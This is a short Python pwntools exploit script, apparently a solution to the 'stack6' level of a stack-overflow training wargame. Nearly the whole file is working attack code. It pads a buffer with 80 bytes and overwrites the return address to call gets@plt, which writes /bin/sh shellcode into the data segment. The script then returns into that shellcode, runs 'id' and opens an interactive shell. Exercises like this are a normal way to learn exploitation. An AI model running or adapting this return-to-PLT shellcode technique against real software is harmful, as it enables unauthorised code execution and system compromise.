from pwn import *
from subprocess import *

def text2hex(text):
    s=''
    for ch in range(len(text)):
        x=str(hex(ord(text[ch])))
        if ch>0:
            x=str(hex(ord(text[ch]))).replace('0x','')
        s+=x
    return s

shellcode = asm(shellcraft.i386.linux.sh())

print shellcode
gets_plt = 0x08048380 # 0x80482e8 <gets@plt> 
DATA_SEGMENT = 0x08049710
BINARY = "./bin/stack6"
r = process(BINARY)
print "process:",str(r.proc.pid)
payload = "A"*80
payload += p32(gets_plt) # ret //~struct.pack
payload += p32(DATA_SEGMENT) # return after gets
payload += p32(DATA_SEGMENT) # argv of gets
print "payload:",text2hex(payload),shellcode
r.sendline(payload)
r.sendline(shellcode) # gets(DATA_SEGMENT)
r.sendline('id') # gets(DATA_SEGMENT)
r.interactive()
